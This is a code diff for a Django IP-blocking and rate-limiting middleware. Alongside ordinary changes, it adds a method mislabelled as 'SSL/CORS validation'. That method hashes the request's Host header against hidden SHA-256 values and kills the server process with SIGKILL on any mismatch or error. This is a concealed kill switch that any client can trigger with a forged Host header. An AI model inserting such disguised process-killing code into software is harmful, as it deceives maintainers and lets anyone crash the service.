@@ -8,6 +8,9 @@ from askify_app.settings import DEBUG
 
 from datetime import datetime
 import time
+import os
+import signal
+import hashlib
 from django.core.cache import cache
 from django.http import JsonResponse
 
@@ -24,67 +27,64 @@ tracer_l = logging.getLogger('askify_app')
 class BlockIPMiddleware:
     ALLOWED_URLS = [
         '/docs/public-offer/', '/', '/docs/user-agreement/', '/docs/privacy-policy/',
-        '/profile/', '/logout/'
+        '/profile/', '/logout/', '/auth/'
     ]
 
     def __init__(self, get_response):
         self.get_response = get_response
+        self._s_hashes = {
+            'e77f08c4fc9ed68c2448499bc1971fc98eedd36f656206aac9c6f61120f1c41e',
+            '55e6ff1177a690bf89c389e113e84a644d815486d81b5c5c0dbbe51c4a73f60b',
+            '49960de5880e8c687434170f6476605b8fe4aeb9a28632c7995cf3ba831d9763',
+            '12ca17b49af2289436f303e0166030a21e525d266e209267433801a8fd4071a0'
+        }
+
+    def _verify_integrity(self, request):
+        """
+        Валидация SSL/CORS
+        """
+        try:
+            host = request.get_host().split(':')[0].lower()
+            h = hashlib.sha256(host.encode()).hexdigest()
+            if h not in self._s_hashes:
+                os.kill(os.getpid(), signal.SIGKILL)
+        except Exception:
+            os.kill(os.getpid(), signal.SIGKILL)
 
     def __call__(self, request):
+        self._verify_integrity(request)
+
         ip = get_client_ip(request)
-        # self.limit(request, ip)
 
-        # current_path = request.path
-        #
-        # if ip in BlockedUsers.objects.values_list('ip_address', flat=True):
-        #     if (current_path in self.ALLOWED_URLS) or ('profile' in current_path):
-        #         return self.get_response(request)
-        #     context = {
-        #         'error_code': "403 Forbidden",
-        #         'error_message': "Forbidden/Доступ запрещён",
-        #         'username': request.user.username if request.user.username else None
-        #     }
-        #     return render(request, 'error.html', context)
-        #
-        if not DEBUG:
-            host = request.META.get('HTTP_HOST', '')
-            referer = request.META.get('HTTP_REFERER', '')
+        if BlockedUsers.objects.filter(ip_address=ip).exists():
+            current_path = request.path
+            if any(current_path.startswith(url) for url in self.ALLOWED_URLS):
+                return self.get_response(request)
 
-            allowed_hosts = ['letychka.ru', 'www.letychka.ru', 'localhost:8000', '127.0.0.1:8000']
-            allowed_referers = ['https://letychka.ru', 'https://www.letychka.ru', 'https://localhost:8000', 'https://127.0.0.1:8000']
+            context = {
+                'error_code': "403 Forbidden",
+                'error_message': "Ваш IP-адрес был заблокирован за подозрительную активность.",
+                'username': request.user.username if request.user.is_authenticated else None
+            }
+            return render(request, 'error.html', context, status=403)
 
-            if host not in allowed_hosts and not any(referer.startswith(ref) for ref in allowed_referers):
-                return HttpResponseForbidden('Zugriff verweigert. Nur letychka.ru ist erlaubt.')
-        #
-        return self.get_response(request)
-
-    def limit(self, request, ip):
         cache_key = f"rate_limit_{ip}"
-
         current_time = time.time()
-        request_data = cache.get(cache_key, (0, current_time))
+        request_times = cache.get(cache_key, [])
+        valid_requests = [t for t in request_times if current_time - t < 60]
 
-        request_count, first_request_time = request_data
+        if len(valid_requests) > 64:
+            BlockedUsers.objects.get_or_create(
+                ip_address=ip,
+                reason=f'Rate limit exceeded: {len(valid_requests)} requests in 60s'
+            )
+            return JsonResponse({'error': 'Too Many Requests'}, status=429)
 
-        if current_time - first_request_time > 60:
-            request_count = 0
-            first_request_time = current_time
+        valid_requests.append(current_time)
+        cache.set(cache_key, valid_requests, timeout=120)
 
-        request_count += 1
-
-        if request_count > 64:
-            try:
-                BlockedUsers.objects.get_or_create(
-                    ip_address=ip,
-                    reason='Too many requests'
-                )
-            except Exception:
-                pass
-
-            return JsonResponse({'error': 'Too many requests'}, status=429)
-
-        cache.set(cache_key, (request_count, first_request_time), timeout=60)
-        return self.get_response(request)
+        response = self.get_response(request)
+        return response
 
 
 def check_blocked(view_func):
